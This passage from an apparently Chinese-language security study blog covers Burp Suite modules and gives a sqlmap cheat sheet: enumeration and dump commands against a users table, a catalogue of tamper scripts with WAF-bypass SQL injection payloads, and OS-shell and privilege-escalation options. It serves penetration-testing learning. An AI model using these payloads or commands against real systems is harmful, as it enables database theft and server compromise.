(3):在获取信息后，单击Load按钮加载信息，然后单击&quot;Analyze now&quot;按钮进行分析。</p><p><strong>Decoder模块(编码器)</strong></p><p>解码器是一个进行手动执行或对应用程序数据者智能解码编码的工具。此功能可用于解码数据找回原来的数据形式，或者进行编码和数据加密。</p><p><strong>Comparper模块(对比器)</strong></p><p>Burp Comparer在Burp中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别，使用的场合有: 枚举用户名的过程，对比分析登录和失败时，服务器端返回结果的区别 使用Intruder进行攻击时，对于不同的服务器端响应，可以很快分析出两次响应的区别在哪里 进行SQL注入的盲注测试时，比较两次响应的差异，判断响应结果与注入条件的关联关系。</p><p>(2):使用Comparer时有两个步骤:第一步是加载数据，第二步是差异分析。</p><p>(3):Comparer数据加载的常用方式如下: 从其他Burp工具通过上下文菜单转发过来 直接粘贴 从文件里加载。</p><p><strong>Extender模块(扩展)</strong></p><p>可以让你加载Burp Suit的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能!</p><p><strong>Project options(全局参数设置)</strong></p><p>在Burp Suite中，存在一些粗粒度的设置，这些设置选项，一旦设置了将会对Burp Suite的整 体产生效果，这就是Options面板。当我们打开Options面板即可看到，它是由 Connections、HTTP、SSL、Sessions、Display、Misc六个选项卡组成。</p><h2 id="NMAP"><a class="header-anchor" href="#NMAP">¶</a>NMAP</h2><p>可以看我博客的另一篇文章《nmap与sqlmap常用参数》😛</p><h2 id="SQLMAP"><a class="header-anchor" href="#SQLMAP">¶</a>SQLMAP</h2><p><strong>信息收集</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 查看数据库相关信息：</span><br><span class="hljs-params">--current-user</span>  枚举当前用户<br><span class="hljs-params">--current-db</span>    枚举当前数据库<br><span class="hljs-params">--dbs</span>        枚举可用的数据库<br><span class="hljs-params">--is-dba</span>      枚举数据库权限<br><span class="hljs-params">--passwords</span>    枚举数据库用户密码<br>  <span class="hljs-params">--is-dba</span>          检测当前网站连接数据的用户是否是为DBA<br><br><span class="hljs-comment"># 指纹识别：</span><br>-f/<span class="hljs-params">--fingerprint</span> 执行检查广泛的DBMS版本指纹<br>-b/<span class="hljs-params">--banner</span>  检测数据库指纹<br><span class="hljs-params">--hostname</span>  枚举主机名称<br><br><span class="hljs-comment"># Waf识别：</span><br><span class="hljs-params">--identify-waf</span>  检测waf信息<br><br><span class="hljs-comment"># 当url有多个参数值时：</span><br>-p 参数<span class="hljs-comment">#当显示302重定向时可以添加Cookie值进行扫描</span><br><br><span class="hljs-comment"># 指定Cookie进行扫描：</span><br><span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;Cookie值&quot;</span><span class="hljs-comment">#当需要登录时才可以扫描出漏洞</span><br></code></pre></td></tr></table></figure><p><strong>常规注入</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs stylus">注入方式<br>sqlmap -uurl            指定目标url跑<br>sqlmap -r head<span class="hljs-selector-class">.txt</span>抓包指定header头信息跑.-r指定文件<br><br>跑数据：<br> <span class="hljs-attr">--dbs</span>跑数据库<br> -D指定数据库<br><br> <span class="hljs-attr">--tables</span>跑表名<br> -T指定表名<br><br> <span class="hljs-attr">--columns</span>跑字段<br> -C指定字段<br><br> <span class="hljs-attr">--dump</span>提取数据<br> <span class="hljs-attr">--count</span>获取表的数量<br> <br>组合参数：<br><br><span class="hljs-attr">--batch</span>    batch：自动选yes。 自动应答SQLMap所提出的配置选项<br><span class="hljs-attr">--banner</span>   查看数据库版本信息（老师那边删除了）<br> -smart   启发式快速判断，节约时间。<br><span class="hljs-attr">--flush-session</span>    清空session缓存，重新扫描该目标<br>-z flu   缩写，忘记可短写，删除缓存<br><span class="hljs-attr">--random-agent</span>   随机请求头<br><span class="hljs-attr">--user-agent</span>=<span class="hljs-string">&quot;某请求头&quot;</span>            指定某请求头<br>  <span class="hljs-attr">--proxy</span> http:<span class="hljs-comment">//127.0.0.1:8080           设置指定的代理</span><br><br><span class="hljs-attr">--threads</span> x设置测试线程数(<span class="hljs-number">1</span>-<span class="hljs-number">10</span>)，默认线程<span class="hljs-number">1</span>,可以自己改大的线程<br><span class="hljs-attr">--risk</span> x执行的风险等级，(<span class="hljs-number">1</span>-<span class="hljs-number">3</span>)默认为<span class="hljs-number">1</span>会测试大部分语句，<span class="hljs-number">2</span>会增加基于事件的测试语句，<span class="hljs-number">3</span>会增加or语句的SQL注入测试<br><br>案例:<br><br> python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--dbs</span>   <span class="hljs-comment">//获取到所有的数据名</span><br> python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--tables</span> -D security  <span class="hljs-comment">//获取到security数据库下的所有表名</span><br> python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--columns</span> -T users -D security  <span class="hljs-comment">//获取到security数据库、users表下的所有字段名</span><br> python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--dump</span> -C <span class="hljs-string">&quot;username,id,password&quot;</span> -T users -D security  <br> <span class="hljs-comment">//获取到security数据库、users表下username,id,password这三个字段的内容</span><br><br>BP获取SQL注入的数据:<br> <br> <span class="hljs-number">1</span>.开启BP并打开监听<br> <span class="hljs-number">2</span>.使用SQLMAP进行注入并进行（这个地方出现了问题，BP没有抓到包,原因是<span class="hljs-attr">--proxy</span>后面加了等号）<br> 用这个：python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--random-agent</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p><strong>Tamper脚本</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs mel">● SQLMAP使用脚本绕过  <br>  ○ sqlmap.py -u- url --tamper “脚本名称.py” <br>● SQLMAP常见绕过脚本（部分）<br>apostrophemask.py<br>适用数据库：ALL 作用：将引号替换为utf<span class="hljs-number">-8</span>，用于过滤单引号 使用脚本前：tamper(<span class="hljs-string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span> AND %EF%BC%871%EF%BC%87=%EF%BC%871<br><br>base64encode.py<br>适用数据库：ALL 作用：替换为base64编码 使用脚本前：tamper(<span class="hljs-string">&quot;1&#x27; AND SLEEP(5)#&quot;</span>) 使用脚本后：MScgQU5EIFNMRUVQKDUpIw==<br><br>multiplespaces.py<br>适用数据库：ALL 作用：围绕sql关键字添加多个空格 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION SELECT foobar&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> UNION SELECT foobar<br><br>space2plus.py<br>适用数据库：ALL 作用：用加号替换空格 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT+id+FROM+users<br><br>nonrecursivereplacement.py<br>适用数据库：ALL 作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将<span class="hljs-keyword">select</span>替换为空） 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION SELECT 2--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> UNIOUNIONN SELESELECTCT <span class="hljs-number">2</span>--<br><br>space2randomblank.py<br>适用数据库：ALL 作用：将空格替换为其他有效字符 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Did%0DFROM%0Ausers<br><br>unionalltounion.py<br>适用数据库：ALL 作用：将union allselect 替换为unionselect 使用脚本前：tamper(<span class="hljs-string">&#x27;-1 UNION ALL SELECT&#x27;</span>) 使用脚本后：<span class="hljs-number">-1</span> UNION SELECT<br><br>securesphere.py<br>适用数据库：ALL 作用：追加特定的字符串 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 1=1&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span> and <span class="hljs-string">&#x27;0having&#x27;</span>=<span class="hljs-string">&#x27;0having&#x27;</span><br><br>space2dash.py<br>适用数据库：ALL 作用：将空格替换为--，并添加一个随机字符串和换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=<span class="hljs-number">9227</span><br><br>space2mssqlblank.py<br>适用数据库：Microsoft SQL Server 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>、Microsoft SQL Server <span class="hljs-number">2005</span> 作用：将空格随机替换为其他空格符号(<span class="hljs-string">&#x27;%01&#x27;</span>, <span class="hljs-string">&#x27;%02&#x27;</span>, <span class="hljs-string">&#x27;%03&#x27;</span>, <span class="hljs-string">&#x27;%04&#x27;</span>, <span class="hljs-string">&#x27;%05&#x27;</span>, <span class="hljs-string">&#x27;%06&#x27;</span>, <span class="hljs-string">&#x27;%07&#x27;</span>, <span class="hljs-string">&#x27;%08&#x27;</span>, <span class="hljs-string">&#x27;%09&#x27;</span>, <span class="hljs-string">&#x27;%0B&#x27;</span>, <span class="hljs-string">&#x27;%0C&#x27;</span>, <span class="hljs-string">&#x27;%0D&#x27;</span>, <span class="hljs-string">&#x27;%0E&#x27;</span>, <span class="hljs-string">&#x27;%0F&#x27;</span>, <span class="hljs-string">&#x27;%0A&#x27;</span>) 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Eid%0DFROM%07users<br><br>between.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：用NOT BETWEEN <span class="hljs-number">0</span> AND #替换&gt; 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND A &gt; B--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND A NOT BETWEEN <span class="hljs-number">0</span> AND B--<br><br>percentage.py<br>适用数据库：ASP 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>, <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>, <span class="hljs-number">5.5</span><span class="hljs-number">.11</span>、PostgreSQL <span class="hljs-number">9.0</span> 作用：在每个字符前添加一个% 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM TABLE&#x27;</span>) 使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E<br><br>sp_password.py<br>适用数据库：MSSQL 作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227-- &#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">9227</span>=<span class="hljs-number">9227</span>-- sp_password<br><br>charencode.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：对给定的payload全部字符使用url编码（不处理已经编码的字符） 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM%20TABLE&#x27;</span>) 使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45<br><br>randomcase.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：随机大小写 使用脚本前：tamper(<span class="hljs-string">&#x27;INSERT&#x27;</span>) 使用脚本后：INseRt<br><br>charunicodeencode.py<br>适用数据库：ASP、ASP.NET 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>/<span class="hljs-number">2005</span>、MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>、PostgreSQL <span class="hljs-number">9.0</span><span class="hljs-number">.3</span> 作用：适用字符串的unicode编码 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD%20FROM TABLE&#x27;</span>) 使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045<br><br>space2comment.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：将空格替换为<span class="hljs-comment">/**/</span> 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT<span class="hljs-comment">/**/</span>id<span class="hljs-comment">/**/</span>FROM<span class="hljs-comment">/**/</span>users<br><br>equaltolike.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span> 作用：将=替换为LIKE 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT * FROM users WHERE id=1&#x27;</span>) 使用脚本后：SELECT * FROM users WHERE id LIKE <span class="hljs-number">1</span><br><br>equaltolike.py<br>测试通过数据库：MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：将&gt;替换为GREATEST，绕过对&gt;的过滤 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND A &gt; B&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND GREATEST(A,B+<span class="hljs-number">1</span>)=A<br><br>ifnull2ifisnull.py<br>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly) 测试通过数据库：MySQL <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span> 作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤 使用脚本前：tamper(<span class="hljs-string">&#x27;IFNULL(1, 2)&#x27;</span>) 使用脚本后：IF(ISNULL(<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br><br>modsecurityversioned.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.0</span> 作用：过滤空格，使用mysql内联注释的方式进行注入 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 2&gt;1--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> <span class="hljs-comment">/*!30874AND 2&gt;1*/</span>--<br><br>space2mysqlblank.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.1</span> 作用：将空格替换为其他空格符号(<span class="hljs-string">&#x27;%09&#x27;</span>, <span class="hljs-string">&#x27;%0A&#x27;</span>, <span class="hljs-string">&#x27;%0C&#x27;</span>, <span class="hljs-string">&#x27;%0D&#x27;</span>, <span class="hljs-string">&#x27;%0B&#x27;</span>) 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Bid%0DFROM%0Cusers<br><br>modsecurityzeroversioned.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.0</span> 作用：使用内联注释方式（<span class="hljs-comment">/*!00000*/</span>）进行注入 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 2&gt;1--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> <span class="hljs-comment">/*!00000AND 2&gt;1*/</span>--<br><br>space2mysqldash.py<br>适用数据库：MySQL、MSSQL 作用：将空格替换为 -- ，并追随一个换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>--%0AAND--%0A9227=<span class="hljs-number">9227</span><br><br>bluecoat.py<br>适用数据库：Blue Coat SGOS 测试通过数据库：MySQL <span class="hljs-number">5.1</span>,、SGOS 作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换= 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users where id = 1&#x27;</span>) 使用脚本后：SELECT%09id FROM users where id LIKE <span class="hljs-number">1</span><br><br>versionedkeywords.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">4.0</span><span class="hljs-number">.18</span>, <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>, <span class="hljs-number">5.5</span><span class="hljs-number">.11</span> 作用：注释绕过 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span><span class="hljs-comment">/*!UNION*/</span><span class="hljs-comment">/*!ALL*/</span><span class="hljs-comment">/*!SELECT*/</span><span class="hljs-comment">/*!NULL*/</span>,<span class="hljs-comment">/*!NULL*/</span>, CONCAT(CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">116</span>,<span class="hljs-number">58</span>),IFNULL(CAST(CURRENT_USER()<span class="hljs-comment">/*!AS*/</span><span class="hljs-comment">/*!CHAR*/</span>),CHAR(<span class="hljs-number">32</span>)),CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">100</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">58</span>))#<br><br>halfversionedmorekeywords.py<br>适用数据库：MySQL &lt; <span class="hljs-number">5.1</span> 测试通过数据库：MySQL <span class="hljs-number">4.0</span><span class="hljs-number">.18</span>/<span class="hljs-number">5.0</span><span class="hljs-number">.22</span> 作用：在每个关键字前添加mysql版本注释 使用脚本前：tamper(<span class="hljs-string">&quot;value&#x27; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;</span>) 使用脚本后：value<span class="hljs-string">&#x27;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;</span>QDWa<span class="hljs-string">&#x27;=&#x27;</span>QDWa<br><br>space2morehash.py<br>适用数据库：MySQL &gt;= <span class="hljs-number">5.1</span><span class="hljs-number">.13</span> 测试通过数据库：MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.41</span> 作用：将空格替换为#，并添加一个随机字符串和换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=<span class="hljs-number">9227</span><br><br>apostrophenullencode.py<br>适用数据库：ALL 作用：用非法双字节Unicode字符替换单引号 使用脚本前：tamper(<span class="hljs-string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span> AND %00%271%00%27=%00%271<br><br>appendnullbyte.py<br>适用数据库：ALL 作用：在有效载荷的结束位置加载null字节字符编码 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 1=1&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%00<br><br>chardoubleencode.py<br>适用数据库：ALL 作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符） 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM%20TABLE&#x27;</span>) 使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545<br><br>unmagicquotes.py<br>适用数据库：ALL 作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格 使用脚本前：tamper(<span class="hljs-string">&quot;1&#x27; AND 1=1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span>%bf%27 AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span>--<br><br>randomcomments.py<br>适用数据库：ALL 作用：用注释符分割sql关键字 使用脚本前：tamper(<span class="hljs-string">&#x27;INSERT&#x27;</span>) 使用脚本后：I<span class="hljs-comment">/**/</span>N<span class="hljs-comment">/**/</span>SERT<br></code></pre></td></tr></table></figure><p><strong>其他参数</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 漏洞探测等级（记住）</span><br>● <span class="hljs-comment">--level 5 漏洞探测等级（1-5）</span><br>  ○ <span class="hljs-comment">--level 1 默认的等级，会进行基本的测试，包括GET和POST方式 </span><br>  ○ <span class="hljs-comment">--level 2 在原有的基础上增加对cookie的检测 </span><br>  ○ <span class="hljs-comment">--level 3 增加对USER AGENT/REFERER的检测 （常用）</span><br>  ○ <span class="hljs-comment">--level 4 更多的payload来测试sql注入 </span><br>  ○ <span class="hljs-comment">--level 5 最高等级，包含所有的payload,会尝试自动破解出cookie、xff等头部注入（速度最慢）</span><br><br><span class="hljs-comment"># 显示信息（记住）</span><br>● -v 显示调试信息的<span class="hljs-number">7</span>个级别 （<span class="hljs-number">0</span><span class="hljs-number">-6</span>）<br>  ○ <span class="hljs-number">0</span>只显示python错误以及严重的信息 (默认)<br>  ○ <span class="hljs-number">1</span>同时显示基本信息和警告信息 <br>  ○ <span class="hljs-number">2</span>同时显示debug信息 <br>  ○ <span class="hljs-number">3</span>同时显示注入的payload （常用）<br>  ○ <span class="hljs-number">4</span>同时显示<span class="hljs-keyword">http</span>请求 <br>  ○ <span class="hljs-number">5</span>同时显示<span class="hljs-keyword">http</span>响应头 <br>  ○ <span class="hljs-number">6</span>同时显示<span class="hljs-keyword">http</span>响应页面 <br><br><span class="hljs-comment"># 指定注入技术</span><br>基于布尔的盲注(B)：即可以根据返回页面判断条件的真假注入<br>基于时间的盲注(T)：既不能根据页面返回内容判断任何任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断<br>基于报错注入(E)：即页面返回错误信息，或者把注入的语句的结果直接返回页面中<br>联合查询注入(U)：可以使用<span class="hljs-built_in">union</span>的情况下的注入<br>堆叠查询注入(S)：可以同时执行多条语句的注入<br><br>注意：可以用<span class="hljs-comment">--technique来指定要使用哪种注入模式，快速扫描</span><br><span class="hljs-comment">--technique BEUST（可单独或混合指定注入模式进行快速扫描）</span><br><br><span class="hljs-comment"># --shell</span><br>要求权限：<span class="hljs-number">1.</span>管理员root <span class="hljs-number">2.</span>有绝对路径 <span class="hljs-number">3.</span>PHP自动转义GPC关闭 <span class="hljs-number">4.</span>secure_file_priv为空（重要！！！！！！！！！！！！！！！！！！！！！！）<br><span class="hljs-comment">--os-cmd   执行操作系统命令                    //eg:--os-cmd=whoami</span><br>  <span class="hljs-comment">--os-shell     获取交互式的操作系统的shell   </span><br>  <span class="hljs-comment">--sql-shell    获取交互式的SQL执行环境</span><br>  <span class="hljs-comment">--sql-query    执行单个SQL语句                     //eg:--sql-query=&quot;select database()&quot;</span><br>  <span class="hljs-comment">--os-pwn       获取一个OOB Shell,Meterpreter或VNC</span><br>  <span class="hljs-comment">--os-smbrelay  一键获取一个OOBShell，Meterpreter或VNC</span><br>  <span class="hljs-comment">--os-bof       存储过程缓冲区溢出利用</span><br>  <span class="hljs-comment">--priv-esc     数据库进程用户权限提升</span><br>  <span class="hljs-comment">--msf-path=MSFPATH  MSF本地安装路径</span><br>  <span class="hljs-comment">--tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br></code></pre></td></tr></table></figure><img src="/posts/d62edc36/SQLmap.jpeg" class><h2 id="Metasploit之msf模块简介"><a class="header-anchor" href="#Metasploit之msf模块简介">¶</a>Metasploit之msf模块简介</h2><h3 id="1-Auxiliaries-辅助模块"><a class="header-anchor" href="#1-Auxiliaries-辅助模块">¶</a>1.Auxiliaries 